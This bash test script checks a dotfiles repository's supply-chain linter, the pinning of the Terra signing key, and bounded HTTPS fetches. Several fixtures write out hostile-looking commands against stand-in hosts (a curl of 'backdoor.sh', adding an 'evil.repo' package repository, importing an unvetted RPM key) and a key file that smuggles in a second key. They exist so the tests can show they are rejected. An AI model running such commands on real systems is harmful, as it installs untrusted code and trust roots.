#!/usr/bin/env bash
set -euo pipefail

# Supply-chain policy (issue #151): the provenance registry, the linter that
# refuses an unregistered network source, and the bounded fetch primitives.

repo_root="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/.." && pwd)"
# shellcheck source=lib/test.sh
source "$repo_root/tests/lib/test.sh"

test_install_cleanup_trap
test_new_root
test_root="$TEST_ROOT"

# --- The registry and its generated inventory are in step ------------------

python3 "$repo_root/scripts/validate-network-sources.py"
python3 "$repo_root/scripts/render-supply-chain.py" --check
printf 'PASS: the network-source registry validates and its inventory is current\n'

# --- Every plan_add step is read, or the build fails ------------------------

python3 "$repo_root/scripts/validate-plan-network.py"
printf 'PASS: every resolved plan step declares the scripts it runs\n'

# The declaration is what `preflight_plan_network` derives its probe set from,
# so a `plan_add` line the tokeniser cannot read drops out of the check in both
# directions and an undeclared network step passes. A trailing comment is valid
# shell that the runtime `[[ $# -eq 8 ]]` check still accepts, so it is the
# cheapest proof that the validator fails closed rather than skipping the line.
plan_tree="$test_root/plan-tree"
mkdir -p "$plan_tree"
tar -C "$repo_root" --exclude=.git --exclude=.claude -cf - . |
  tar -C "$plan_tree" -xf -
sed -i '/plan_add ai /s/$/  # keep in step order/' \
  "$plan_tree/platforms/fedora/install.sh"
run_capture python3 "$repo_root/scripts/validate-plan-network.py" --root "$plan_tree"
assert_failure
assert_contains "$TEST_OUTPUT" 'cannot read this plan_add line as a command'
assert_contains "$TEST_OUTPUT" 'platforms/fedora/install.sh:'
printf 'PASS: a plan_add line the tokeniser cannot read is a build error\n'

# A helper reached only through a conditional is still reached. The regex that
# used to find the callee here anchored on what opens a command and let the
# opener itself be the callee, so `if helper; then` read as calls to `if` and
# `then` and the script behind the helper was never required to be declared.
# That is the failing open the validator exists to prevent:
# `preflight_plan_network` derives its probe set from the declaration, so the
# host is never probed and the run mutates before it discovers it cannot
# download. Both spellings of the hidden call get a case, because widening the
# opener set without excluding the keywords from the callee fixes neither.
hidden_tree="$test_root/hidden-call-tree"
mkdir -p "$hidden_tree"
tar -C "$repo_root" --exclude=.git --exclude=.claude -cf - . |
  tar -C "$hidden_tree" -xf -
hidden_install="$hidden_tree/platforms/fedora/install.sh"
cp "$hidden_install" "$test_root/fedora-install.pristine"

# hide_call <conditional>: the theme step's apply function, which declares no
# scripts at all, reaching the Tailscale installer only through the given
# conditional. The mutation is checked with `bash -n` first, because a case
# that is not valid shell proves nothing about a reader of shell.
hide_call() {
  cp "$test_root/fedora-install.pristine" "$hidden_install"
  python3 - "$hidden_install" "$1" <<'PYTHON'
import pathlib
import sys

install, conditional = pathlib.Path(sys.argv[1]), sys.argv[2]
original = (
    'apply_theme() { [[ ! -x "$HOME/.local/bin/theme" ]] || '
    '"$HOME/.local/bin/theme" "$theme"; }'
)
text = install.read_text(encoding="utf-8")
if original not in text:
    raise SystemExit(f"{install}: apply_theme is not the line this test rewrites")
install.write_text(
    text.replace(
        original,
        "fedora_extra_step() { plan_command_run fedora_tailscale_command; }\n"
        "apply_theme() { " + conditional + "; "
        '[[ ! -x "$HOME/.local/bin/theme" ]] || "$HOME/.local/bin/theme" "$theme"; }',
    )
)
PYTHON
  bash -n "$hidden_install"
  run_capture python3 "$repo_root/scripts/validate-plan-network.py" --root "$hidden_tree"
}

undeclared_message='step theme runs platforms/fedora/scripts/install-tailscale.sh but does not declare it'

hide_call 'if fedora_extra_step; then :; fi'
assert_failure
assert_contains "$TEST_OUTPUT" "$undeclared_message"
printf 'PASS: a script reached through `if helper; then` must still be declared\n'

hide_call 'if [[ "$install_tailscale" == true ]]; then fedora_extra_step; fi'
assert_failure
assert_contains "$TEST_OUTPUT" "$undeclared_message"
printf 'PASS: the one-line `if cond; then helper; fi` hides nothing either\n'

# The same helper called plainly, which is the case that always failed. It is
# here so that a reader which stopped finding calls altogether could not pass
# the two cases above by reading nothing at all.
hide_call 'fedora_extra_step'
assert_failure
assert_contains "$TEST_OUTPUT" "$undeclared_message"
printf 'PASS: the plain call is still reported, so the cases above are not vacuous\n'

cp "$test_root/fedora-install.pristine" "$hidden_install"
run_capture python3 "$repo_root/scripts/validate-plan-network.py" --root "$hidden_tree"
assert_success
printf 'PASS: the copied tree validates unmutated, so the mutation is the variable\n'

# Everything the audit named as a trust source is actually registered.
for source_id in terra-repo terra-signing-key rpmfusion-free-release \
  rpmfusion-nonfree-release tailscale-repo mise-installer starship-installer \
  homebrew-installer homebrew-formulae scoop-installer catppuccin-tmux \
  catppuccin-kde firstmate-repo treehouse-installer no-mistakes-installer \
  npm-registry opam-repository lazyvim-plugins mason-registry \
  mason-registry-crashdummyy validation-image-fedora; do
  awk -F '\t' -v want="$source_id" \
    'NR > 1 && $1 == want { found = 1 } END { exit !found }' \
    "$repo_root/config/network-sources.tsv" || {
    printf 'Network source is not registered: %s\n' "$source_id" >&2
    exit 1
  }
done
printf 'PASS: every audited trust source has a registry entry\n'

# --- The linter fails closed on a new, unregistered source -----------------

fixture_repo="$test_root/fixture-repo"
cp -R "$repo_root" "$fixture_repo" 2>/dev/null || {
  printf 'Could not copy the repository for the linter fixture.\n' >&2
  exit 1
}
rm -rf -- "$fixture_repo/.git"
git -C "$fixture_repo" init -q
git -C "$fixture_repo" config user.name Test
git -C "$fixture_repo" config user.email test@example.invalid
git -C "$fixture_repo" add -A
git -C "$fixture_repo" commit -qm 'Fixture'

lint_fixture() {
  python3 "$fixture_repo/scripts/validate-network-sources.py" 2>&1
}

lint_fixture >/dev/null
printf 'PASS: the copied fixture repository lints clean before it is broken\n'

cat >"$fixture_repo/scripts/unregistered-source.sh" <<'EOF'
#!/usr/bin/env bash
curl --fail --silent https://example.invalid/install.sh --output /tmp/x
EOF
git -C "$fixture_repo" add -A
if lint_output="$(lint_fixture)"; then
  printf 'The linter accepted an unregistered curl source.\n' >&2
  exit 1
fi
assert_contains "$lint_output" 'unregistered curl network source'
printf 'PASS: an unregistered curl source fails the linter\n'

cat >"$fixture_repo/scripts/unregistered-source.sh" <<'EOF'
#!/usr/bin/env bash
# network-source: not-a-real-source
curl --fail --silent https://example.invalid/install.sh --output /tmp/x
EOF
if lint_output="$(lint_fixture)"; then
  printf 'The linter accepted an unknown network-source id.\n' >&2
  exit 1
fi
assert_contains "$lint_output" 'unknown network-source id'
rm -f -- "$fixture_repo/scripts/unregistered-source.sh"
git -C "$fixture_repo" add -A
printf 'PASS: an unknown network-source id fails the linter\n'

cat >"$fixture_repo/scripts/unregistered-clone.sh" <<'EOF'
#!/usr/bin/env bash
git clone https://example.invalid/thing.git /tmp/thing
EOF
git -C "$fixture_repo" add -A
if lint_output="$(lint_fixture)"; then
  printf 'The linter accepted an unregistered Git clone source.\n' >&2
  exit 1
fi
assert_contains "$lint_output" 'unregistered git-remote network source'
rm -f -- "$fixture_repo/scripts/unregistered-clone.sh"
git -C "$fixture_repo" add -A
printf 'PASS: an unregistered Git clone fails the linter\n'

cat >"$fixture_repo/scripts/unregistered-image.sh" <<'EOF'
#!/usr/bin/env bash
podman run --rm docker.io/library/nonesuch:latest true
EOF
git -C "$fixture_repo" add -A
if lint_output="$(lint_fixture)"; then
  printf 'The linter accepted an unregistered validation image.\n' >&2
  exit 1
fi
assert_contains "$lint_output" 'unregistered container-image network source'
rm -f -- "$fixture_repo/scripts/unregistered-image.sh"
git -C "$fixture_repo" add -A
printf 'PASS: an unregistered container image fails the linter\n'

# Docker Hub shorthand pulls exactly as much code as the registry-qualified
# form, so leaving the registry out must not leave the gate behind.
cat >"$fixture_repo/scripts/unregistered-shorthand-image.sh" <<'EOF'
#!/usr/bin/env bash
docker pull nonesuch/nonesuch:latest
docker run --rm nonesuch/nonesuch:latest true
EOF
git -C "$fixture_repo" add -A
if lint_output="$(lint_fixture)"; then
  printf 'The linter accepted an unregistered Docker Hub shorthand image.\n' >&2
  exit 1
fi
assert_contains "$lint_output" 'unregistered container-image network source'
rm -f -- "$fixture_repo/scripts/unregistered-shorthand-image.sh"
git -C "$fixture_repo" add -A
printf 'PASS: an unregistered Docker Hub shorthand image fails the linter\n'

# ... and `owner/name:tag` outside a container context is ordinary text. A
# desktop association reads exactly like an image reference, and flagging one
# would make the linter noise people learn to ignore.
cat >"$fixture_repo/scripts/mentions-associations.sh" <<'EOF'
#!/usr/bin/env bash
associations=("image/jpeg:org.kde.gwenview.desktop" "video/mp4:mpv.desktop")
printf '%s\n' "${associations[@]}"
EOF
git -C "$fixture_repo" add -A
lint_fixture >/dev/null
rm -f -- "$fixture_repo/scripts/mentions-associations.sh"
git -C "$fixture_repo" add -A
printf 'PASS: an image-shaped string outside a container context needs no annotation\n'

# A clone spelled as an argument vector is the same clone: this is how Lua,
# Python and PowerShell spawn git, and how the Neovim bootstrap does.
cat >"$fixture_repo/nvim-lazyvim/.config/nvim/lua/plugins/unregistered.lua" <<'EOF'
return {
  setup = function()
    vim.fn.system({ "git", "clone", "https://example.invalid/thing.git", "/tmp/thing" })
  end,
}
EOF
git -C "$fixture_repo" add -A
if lint_output="$(lint_fixture)"; then
  printf 'The linter accepted an argv-form clone in a Lua file.\n' >&2
  exit 1
fi
assert_contains "$lint_output" 'lua/plugins/unregistered.lua:3'
assert_contains "$lint_output" 'unregistered git-remote network source'
rm -f -- "$fixture_repo/nvim-lazyvim/.config/nvim/lua/plugins/unregistered.lua"
git -C "$fixture_repo" add -A
printf 'PASS: an argv-form git clone in a Lua file fails the linter\n'

# A presence check or a package-list entry is not an invocation and must not
# require an annotation, or the linter becomes noise people learn to ignore.
cat >"$fixture_repo/scripts/mentions-curl.sh" <<'EOF'
#!/usr/bin/env bash
packages=(bat curl eza)
require_command curl
printf 'curl is required.\n'
EOF
git -C "$fixture_repo" add -A
lint_fixture >/dev/null
rm -f -- "$fixture_repo/scripts/mentions-curl.sh"
git -C "$fixture_repo" add -A
printf 'PASS: naming curl without invoking it needs no annotation\n'

# Files are selected by what they are, not only by their suffix: an
# extensionless public entry point, a stowed command the role inventory
# classifies, and an asset known only by its shebang are all scanned. Editor
# configuration and a package manifest download as much as an installer does,
# and the library that performs every transfer is held to the rule it exists
# to serve rather than exempted from it.
for scanned_file in doctor bin/.local/bin/theme platforms/fedora/assets/dotfiles-sway \
  nvim-lazyvim/.config/nvim/lua/plugins/mason.lua platforms/macos/Brewfile \
  common/lib/fetch.sh; do
  printf 'curl -fsSL https://example.invalid/x.sh --output /tmp/x\n' \
    >>"$fixture_repo/$scanned_file"
  if lint_output="$(lint_fixture)"; then
    printf 'The linter accepted an unregistered curl source in %s.\n' \
      "$scanned_file" >&2
    exit 1
  fi
  assert_contains "$lint_output" "network sources: $scanned_file:"
  assert_contains "$lint_output" 'unregistered curl network source'
  git -C "$fixture_repo" checkout -q -- "$scanned_file"
done
lint_fixture >/dev/null
printf 'PASS: extensionless and shebang-only scripts are scanned for network sources\n'

# Adding a package repository or a signing key gives the machine a new trust
# root, which is more than a download, so both must be registered too.
trust_root_installer=platforms/fedora/scripts/install-system.sh
cat >>"$fixture_repo/$trust_root_installer" <<'EOF'
sudo dnf config-manager addrepo --from-repofile=https://example.invalid/evil.repo
sudo rpm --import https://example.invalid/key.asc
EOF
if lint_output="$(lint_fixture)"; then
  printf 'The linter accepted an unregistered package trust root.\n' >&2
  exit 1
fi
assert_contains "$lint_output" \
  "network sources: $trust_root_installer:"
assert_contains "$lint_output" 'unregistered dnf-addrepo network source'
assert_contains "$lint_output" 'unregistered rpm-key-import network source'
git -C "$fixture_repo" checkout -q -- "$trust_root_installer"
printf 'PASS: an unregistered DNF repository or RPM signing key fails the linter\n'

# An annotation covers the host it names, not whatever construct happens to
# follow it. A download placed under an unrelated one inherits nothing.
cat >"$fixture_repo/scripts/inherited-annotation.sh" <<'EOF'
#!/usr/bin/env bash
# network-source: homebrew-installer
curl --fail --silent https://example.invalid/install.sh --output /tmp/x
EOF
git -C "$fixture_repo" add -A
if lint_output="$(lint_fixture)"; then
  printf 'The linter let an annotation for one host cover another.\n' >&2
  exit 1
fi
assert_contains "$lint_output" 'downloads from example.invalid'
assert_contains "$lint_output" 'homebrew-installer'

# The same annotation over the host it really names is accepted, so the case
# above fails for the host and not merely for being strict.
cat >"$fixture_repo/scripts/inherited-annotation.sh" <<'EOF'
#!/usr/bin/env bash
# network-source: homebrew-installer
curl --fail --silent \
  https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh \
  --output /tmp/x
EOF
git -C "$fixture_repo" add -A
lint_fixture >/dev/null
rm -f -- "$fixture_repo/scripts/inherited-annotation.sh"
git -C "$fixture_repo" add -A
printf 'PASS: an annotation satisfies only a download from the host it names\n'

# `caller-provided` says the URL comes from the call site. It cannot launder a
# host written into the transfer library itself.
cat >>"$fixture_repo/common/lib/fetch.sh" <<'EOF'

# network-source: caller-provided
curl --fail --silent https://example.invalid/backdoor.sh --output /tmp/x
EOF
if lint_output="$(lint_fixture)"; then
  printf 'The linter accepted a hardcoded URL under caller-provided.\n' >&2
  exit 1
fi
assert_contains "$lint_output" 'common/lib/fetch.sh:'
assert_contains "$lint_output" 'downloads from example.invalid'
git -C "$fixture_repo" checkout -q -- common/lib/fetch.sh
lint_fixture >/dev/null
printf 'PASS: caller-provided does not cover a URL hardcoded in the fetch library\n'

# The real call sites are flagged as well: only their annotation passes them.
# The annotation is matched without its comment marker, so a Lua `--` comment
# is deleted like a `#` one.
for annotated in platforms/fedora/lib/tailscale.sh:tailscale-repo:dnf-addrepo \
  platforms/fedora/lib/fedora.sh:terra-signing-key:rpm-key-import \
  common/lib/fetch.sh:caller-provided:curl \
  nvim-lazyvim/.config/nvim/lua/config/lazy.lua:lazy-nvim:git-remote \
  .github/workflows/real-install.yml:parrot-boundary-image:container-image; do
  IFS=: read -r annotated_file annotated_id annotated_label <<<"$annotated"
  sed -i "/network-source: $annotated_id\$/d" "$fixture_repo/$annotated_file"
  if lint_output="$(lint_fixture)"; then
    printf 'The linter accepted %s without its annotation.\n' \
      "$annotated_file" >&2
    exit 1
  fi
  assert_contains "$lint_output" \
    "network sources: $annotated_file:"
  assert_contains "$lint_output" "unregistered $annotated_label network source"
  git -C "$fixture_repo" checkout -q -- "$annotated_file"
done
lint_fixture >/dev/null
printf 'PASS: the real repository and signing-key call sites need their annotations\n'

# --- Tier claims must match the integrity mechanism -------------------------

manifest_fixture="$test_root/network-sources.tsv"
awk -F '\t' 'BEGIN { OFS = "\t" }
  NR > 1 && $1 == "firstmate-repo" { $7 = "immutable-verified" }
  { print }' "$repo_root/config/network-sources.tsv" >"$manifest_fixture"
if lint_output="$(NETWORK_SOURCE_MANIFEST="$manifest_fixture" \
  python3 "$repo_root/scripts/validate-network-sources.py" 2>&1)"; then
  printf 'The linter accepted an unverifiable immutable-verified claim.\n' >&2
  exit 1
fi
assert_contains "$lint_output" 'claims immutable-verified'
printf 'PASS: an immutable-verified claim without real verification is rejected\n'

awk -F '\t' 'BEGIN { OFS = "\t" }
  NR > 1 && $1 == "catppuccin-tmux" { $8 = "2.3.x" }
  { print }' "$repo_root/config/network-sources.tsv" >"$manifest_fixture"
if lint_output="$(NETWORK_SOURCE_MANIFEST="$manifest_fixture" \
  python3 "$repo_root/scripts/validate-network-sources.py" 2>&1)"; then
  printf 'The linter accepted a wildcard as an exact pin.\n' >&2
  exit 1
fi
assert_contains "$lint_output" 'wildcard'
printf 'PASS: a wildcard is never accepted as an exact pin\n'

# --- A digest pin the consumer does not use is not a pin -------------------
#
# The Parrot boundary image was registered with its tag while the workflow
# pulled `parrotsec/core:latest`, so the registry's claim and the job's
# behaviour could drift without anything noticing. A recorded digest now has
# to be the reference the consumer actually names.
awk -F '\t' 'BEGIN { OFS = "\t" }
  NR > 1 && $1 == "parrot-boundary-image" {
    $9 = "sha256:" sprintf("%064d", 0)
  }
  { print }' "$repo_root/config/network-sources.tsv" >"$manifest_fixture"
if lint_output="$(NETWORK_SOURCE_MANIFEST="$manifest_fixture" \
  python3 "$repo_root/scripts/validate-network-sources.py" 2>&1)"; then
  printf 'The linter accepted a digest no consumer pulls.\n' >&2
  exit 1
fi
assert_contains "$lint_output" 'is recorded as image-digest-pinned'
assert_contains "$lint_output" '.github/workflows/real-install.yml does not name that digest'
printf 'PASS: a recorded image digest must be the one its consumers pull\n'

# --- Terra: no --nogpgcheck, and the key is fingerprint-pinned -------------

# Comments may still explain why the flag is gone; a live invocation may not.
nogpgcheck_uses="$(grep -rn -- '--nogpgcheck' "$repo_root/platforms" \
  "$repo_root/common" "$repo_root/scripts" 2>/dev/null |
  grep -vE ':[[:space:]]*#' || true)"
if [[ -n "$nogpgcheck_uses" ]]; then
  printf 'An installer still passes --nogpgcheck:\n%s\n' "$nogpgcheck_uses" >&2
  exit 1
fi
assert_file_contains "$repo_root/platforms/fedora/lib/fedora.sh" \
  'terra_pinned_fingerprint'
assert_file_contains "$repo_root/platforms/fedora/lib/fedora.sh" \
  '--setopt=terra.gpgcheck=1'
while IFS=$'\t' read -r releasever fingerprint; do
  [[ "$releasever" != \#* && -n "$releasever" ]] || continue
  [[ "$fingerprint" =~ ^[0-9A-F]{40}$ ]] || {
    printf 'Terra key fingerprint for %s is not a 40-character hex value: %s\n' \
      "$releasever" "$fingerprint" >&2
    exit 1
  }
done <"$repo_root/config/terra-keys.tsv"
printf 'PASS: the Terra bootstrap is key-verified and carries no --nogpgcheck\n'

# --- Terra: the fingerprint gate decides whether the key is imported --------

# Behavioural, offline cases. The manifest is a fixture so pinning or retiring a
# real release never changes what these cases prove.
terra_bin="$test_root/terra-bin"
terra_log="$test_root/terra-commands.log"
terra_state="$test_root/terra-state"
terra_manifest="$test_root/terra-keys.tsv"
terra_pinned_fpr=1111111111111111111111111111111111111111
terra_other_fpr=2222222222222222222222222222222222222222
mkdir -p "$terra_bin"
printf '# releasever\tfingerprint\n90\t%s\n' "$terra_pinned_fpr" >"$terra_manifest"

# The RPM keyring is modelled as "fixture-key:<fingerprint>" lines, which is
# what the rpm stub prints as each key's description and the gpg stub turns
# back into colon records.
cat >"$terra_bin/rpm" <<'EOF'
#!/usr/bin/env bash
case "$1 ${2:-}" in
'-q terra-release') [[ -e "$MOCK_STATE/terra-release" ]] ;;
'-q gpg-pubkey')
  [[ -s "$MOCK_STATE/keyring" ]] || {
    printf 'package gpg-pubkey is not installed\n'
    exit 1
  }
  cat "$MOCK_STATE/keyring"
  ;;
'-E %fedora') printf '%s\n' "$MOCK_RELEASEVER" ;;
--import*) printf 'rpm %s\n' "$*" >>"$MOCK_LOG" ;;
*) exit 64 ;;
esac
EOF
cat >"$terra_bin/gpg" <<'EOF'
#!/usr/bin/env bash
[[ "$1 $2" == '--show-keys --with-colons' ]] || exit 64
if (($# == 2)); then
  awk -F: '$1 == "fixture-key" {
    print "pub:-:4096:1:0000000000000000:0:::-:::scESC::::::23::0:"
    print "fpr:::::::::" $2 ":"
  }'
  exit 0
fi
# MOCK_FPR is a list, because an armoured key file is a concatenation of key
# blocks and the cases below need to serve one carrying more than one key.
for fingerprint in $MOCK_FPR; do
  printf 'pub:-:4096:1:0000000000000000:0:::-:::scESC::::::23::0:\n'
  printf 'fpr:::::::::%s:\n' "$fingerprint"
done
EOF
cat >"$terra_bin/curl" <<'EOF'
#!/usr/bin/env bash
while (($#)); do
  case "$1" in
  --output) output="$2"; shift 2 ;;
  *) shift ;;
  esac
done
printf -- '-----BEGIN PGP PUBLIC KEY BLOCK-----\nfixture\n' >"$output"
EOF
cat >"$terra_bin/sudo" <<'EOF'
#!/usr/bin/env bash
printf 'sudo %s\n' "$*" >>"$MOCK_LOG"
exec "$@"
EOF
cat >"$terra_bin/dnf" <<'EOF'
#!/usr/bin/env bash
if [[ "$1" == --dump-repo-config=terra ]]; then
  printf '======== "terra" repository configuration: ========\n'
  printf 'gpgcheck = %s\npkg_gpgcheck = %s\n' "$MOCK_GPGCHECK" "$MOCK_GPGCHECK"
  exit 0
fi
printf 'dnf %s\n' "$*" >>"$MOCK_LOG"
: >"$MOCK_STATE/terra-release"
EOF
chmod +x "$terra_bin"/*

# run_terra <releasever> <served fingerprint>... [env assignment ...]
# The served fingerprints are one space-separated argument: one per key block
# the fetched file is made to carry.
# shellcheck disable=SC2016 # $1 is the inner shell's positional argument.
run_terra() {
  local releasever="$1" fingerprint="$2"
  shift 2
  rm -rf -- "$terra_state"
  mkdir -p "$terra_state"
  : >"$terra_log"
  run_capture env PATH="$terra_bin:$PATH" \
    MOCK_LOG="$terra_log" MOCK_STATE="$terra_state" \
    MOCK_RELEASEVER="$releasever" MOCK_FPR="$fingerprint" \
    TERRA_KEY_MANIFEST="$terra_manifest" \
    DOTFILES_FETCH_ATTEMPTS=1 DOTFILES_FETCH_RETRY_DELAY=0 \
    "$@" \
    bash -c '
      set -euo pipefail
      source "$1/common/lib/common.sh"
      source "$1/platforms/fedora/lib/fedora.sh"
      ensure_terra_repository
    ' _ "$repo_root" </dev/null
}

run_terra 90 "$terra_pinned_fpr"
assert_success
assert_contains "$TEST_OUTPUT" "matches the pinned fingerprint $terra_pinned_fpr"
assert_file_contains "$terra_log" 'rpm --import'
assert_file_contains "$terra_log" '--setopt=terra.gpgcheck=1'
assert_eq 'sudo rpm --import' "$(head -n1 "$terra_log" | cut -d' ' -f1-3)" \
  'the pinned key must be imported before terra-release is installed'
printf 'PASS: a key matching the pinned fingerprint is imported before terra-release\n'

run_terra 90 "$terra_other_fpr"
assert_failure
assert_contains "$TEST_OUTPUT" 'fingerprint mismatch'
assert_file_empty "$terra_log"
printf 'PASS: a key that does not match the pin is refused before any import\n'

run_terra 91 "$terra_other_fpr"
assert_failure
assert_contains "$TEST_OUTPUT" 'Refusing to import an unpinned Terra signing key'
assert_file_empty "$terra_log"
printf 'PASS: an unpinned release is refused without an acknowledgement\n'

run_terra 91 "$terra_other_fpr" TERRA_TRUST_KEY_FINGERPRINT="$terra_other_fpr"
assert_success
assert_contains "$TEST_OUTPUT" "caller's explicit acknowledgement"
assert_file_contains "$terra_log" 'rpm --import'
printf 'PASS: an acknowledged unpinned key is imported\n'

# `rpm --import` trusts every key block in the file it is handed, so a check
# that reads one fingerprint out of that file is not a check on the file. The
# shape that makes the difference concrete is a file whose first block is the
# pinned key and whose second is anyone else's: it satisfies any single-value
# comparison and still installs the second key. It has to be refused on the
# count alone, and the empty command log is the load-bearing half of the
# assertion, because a refusal that happens after the import is not a refusal.
run_terra 90 "$terra_pinned_fpr $terra_other_fpr"
assert_failure
assert_contains "$TEST_OUTPUT" 'holds 2 OpenPGP keys'
assert_contains "$TEST_OUTPUT" "$terra_pinned_fpr"
assert_contains "$TEST_OUTPUT" "$terra_other_fpr"
assert_file_empty "$terra_log"
printf 'PASS: a key file smuggling a second key past the pin is refused before any import\n'

# The same count rule has to hold where there is no pin to fall back on, or the
# acknowledgement becomes the hole the pin no longer is: an operator who names
# one fingerprint must not thereby import a key they were never shown.
run_terra 91 "$terra_other_fpr $terra_pinned_fpr" \
  TERRA_TRUST_KEY_FINGERPRINT="$terra_other_fpr"
assert_failure
assert_contains "$TEST_OUTPUT" 'holds 2 OpenPGP keys'
assert_file_empty "$terra_log"
printf 'PASS: an acknowledgement cannot carry a second, unnamed key into the keyring\n'

# --- Terra: the verifier re-asserts the trust root on every run ------------

# The bootstrap returns early once terra-release is installed, so these cases
# drive the read-only verifier section with the same stubs. MOCK_LOG records
# every sudo, import and install; the verifier must leave it empty.
assert_file_contains "$repo_root/platforms/fedora/scripts/verify.sh" \
  'verify_terra_trust_root'

# run_terra_verify <terra-release installed?> <releasever> <gpgcheck>
#   [keyring fingerprint ...]
# shellcheck disable=SC2016 # $1 is the inner shell's positional argument.
run_terra_verify() {
  local installed="$1" releasever="$2" gpgcheck="$3"
  shift 3
  rm -rf -- "$terra_state"
  mkdir -p "$terra_state"
  : >"$terra_log"
  [[ "$installed" != true ]] || : >"$terra_state/terra-release"
  (($# == 0)) || printf 'fixture-key:%s\n' "$@" >"$terra_state/keyring"
  run_capture env PATH="$terra_bin:$PATH" \
    MOCK_LOG="$terra_log" MOCK_STATE="$terra_state" \
    MOCK_RELEASEVER="$releasever" MOCK_GPGCHECK="$gpgcheck" \
    TERRA_KEY_MANIFEST="$terra_manifest" \
    bash -c '
      set -u
      source "$1/common/lib/common.sh"
      source "$1/common/lib/verify.sh"
      source "$1/platforms/fedora/lib/fedora.sh"
      verify_terra_trust_root
      finish_verification "Terra trust root"
    ' _ "$repo_root" </dev/null
}

run_terra_verify true 90 1 "$terra_other_fpr" "$terra_pinned_fpr"
assert_success
assert_contains "$TEST_OUTPUT" 'terra repository enforces package signatures (gpgcheck = 1)'
assert_contains "$TEST_OUTPUT" \
  "Terra signing key for Fedora 90 is in the RPM keyring and matches the pinned fingerprint $terra_pinned_fpr"
assert_file_empty "$terra_log"
printf 'PASS: the verifier accepts gpgcheck = 1 with the pinned key in the keyring, read-only\n'

run_terra_verify true 90 0 "$terra_pinned_fpr"
assert_failure
assert_contains "$TEST_OUTPUT" 'terra repository has gpgcheck = 0, pkg_gpgcheck = 0, expected 1'
assert_file_empty "$terra_log"
printf 'PASS: the verifier fails a terra repository with gpgcheck = 0\n'

run_terra_verify true 90 1 "$terra_other_fpr"
assert_failure
assert_contains "$TEST_OUTPUT" \
  "The pinned Terra signing key for Fedora 90 ($terra_pinned_fpr) is not in the RPM keyring"
run_terra_verify true 90 1
assert_failure
assert_contains "$TEST_OUTPUT" "($terra_pinned_fpr) is not in the RPM keyring"
assert_file_empty "$terra_log"
printf 'PASS: the verifier fails when the pinned Terra key is missing from the keyring\n'

run_terra_verify true 91 1 "$terra_other_fpr"
assert_success
assert_contains "$TEST_OUTPUT" 'No pinned Terra signing key for Fedora 91'
assert_contains "$TEST_OUTPUT" 'passed with warnings'
printf 'PASS: the verifier warns, like the installer, for an unpinned Fedora release\n'

run_terra_verify false 90 1 "$terra_pinned_fpr"
assert_failure
assert_contains "$TEST_OUTPUT" 'terra-release is not installed'
printf 'PASS: the verifier fails when terra-release is not installed\n'

# --- Bounded fetch behaviour ------------------------------------------------

fetch_bin="$test_root/fetch-bin"
mkdir -p "$fetch_bin"
attempt_log="$test_root/curl-attempts.log"

cat >"$fetch_bin/curl" <<'EOF'
#!/usr/bin/env bash
set -u
printf 'attempt\n' >>"$CURL_ATTEMPT_LOG"
output=""
while (($#)); do
  case "$1" in
  --output) output="${2:-}"; shift 2 ;;
  *) shift ;;
  esac
done
case "${CURL_MODE:-ok}" in
fail) exit 7 ;;
empty) exit 0 ;;
recover)
  if [[ "$(wc -l <"$CURL_ATTEMPT_LOG")" -lt 2 ]]; then
    exit 7
  fi
  printf '#!/bin/sh\ntrue\n' >"$output"
  ;;
*) printf '#!/bin/sh\ntrue\n' >"$output" ;;
esac
EOF
chmod +x "$fetch_bin/curl"

# The bash -c bodies below are single-quoted on purpose: $1/$2 are that
# inner shell's positional arguments, not this script's variables.
# shellcheck disable=SC2016
run_fetch() {
  local mode="$1"
  local destination="$2"
  shift 2
  : >"$attempt_log"
  env PATH="$fetch_bin:$PATH" CURL_MODE="$mode" \
    CURL_ATTEMPT_LOG="$attempt_log" \
    DOTFILES_FETCH_ATTEMPTS=3 DOTFILES_FETCH_RETRY_DELAY=0 \
    "$@" \
    bash -c '
      set -euo pipefail
      source "$1/common/lib/common.sh"
      source "$1/common/lib/fetch.sh"
      fetch_to_file https://example.invalid/payload "$2" "the payload"
    ' _ "$repo_root" "$destination"
}

destination="$test_root/payload"
run_fetch ok "$destination" >/dev/null
assert_path_exists "$destination"
assert_eq 600 "$(stat -c '%a' "$destination")" 'staged file mode'
assert_eq 1 "$(wc -l <"$attempt_log")" 'a successful fetch retried unnecessarily'
printf 'PASS: a successful bounded fetch runs once and stages a mode-0600 file\n'

run_fetch recover "$destination" >/dev/null
assert_path_exists "$destination"
assert_eq 2 "$(wc -l <"$attempt_log")" 'transient recovery attempt count'
printf 'PASS: a transient failure retries within the bounded attempt budget\n'

if fetch_output="$(run_fetch fail "$destination" 2>&1)"; then
  printf 'A permanently failing fetch reported success.\n' >&2
  exit 1
fi
assert_contains "$fetch_output" 'Giving up on the payload after 3 attempt(s)'
assert_eq 3 "$(wc -l <"$attempt_log")" 'permanent failure attempt count'
assert_path_missing "$destination"
printf 'PASS: a permanent fetch failure exits clearly after a bounded budget\n'

if fetch_output="$(run_fetch empty "$destination" 2>&1)"; then
  printf 'An empty download reported success.\n' >&2
  exit 1
fi
assert_contains "$fetch_output" 'Download produced an empty file'
printf 'PASS: an HTTP 200 with an empty body is a failure, not a success\n'

# A non-HTTPS URL is refused before any transfer starts.
# shellcheck disable=SC2016
if fetch_output="$(env PATH="$fetch_bin:$PATH" CURL_ATTEMPT_LOG="$attempt_log" \
  bash -c '
    set -euo pipefail
    source "$1/common/lib/common.sh"
    source "$1/common/lib/fetch.sh"
    fetch_to_file http://example.invalid/payload "$2" "the payload"
  ' _ "$repo_root" "$destination" 2>&1)"; then
  printf 'A plaintext HTTP download was accepted.\n' >&2
  exit 1
fi
assert_contains "$fetch_output" 'Refusing a non-HTTPS download'
printf 'PASS: a non-HTTPS download is refused before any transfer\n'

# Digest and shape checks.
# shellcheck disable=SC2016
shape_target="$test_root/shape"
printf '<html>nope</html>\n' >"$shape_target"
if shape_output="$(bash -c '
  set -euo pipefail
  source "$1/common/lib/common.sh"
  source "$1/common/lib/fetch.sh"
  fetch_assert_shell_script "$2" "the payload"
' _ "$repo_root" "$shape_target" 2>&1)"; then
  printf 'Markup was accepted as a shell script.\n' >&2
  exit 1
fi
assert_contains "$shape_output" 'does not look like a shell script'

printf '#!/bin/sh\ntrue\n' >"$shape_target"
if digest_output="$(bash -c '
  set -euo pipefail
  source "$1/common/lib/common.sh"
  source "$1/common/lib/fetch.sh"
  fetch_verify_sha256 "$2" 0000000000000000000000000000000000000000000000000000000000000000 "the payload"
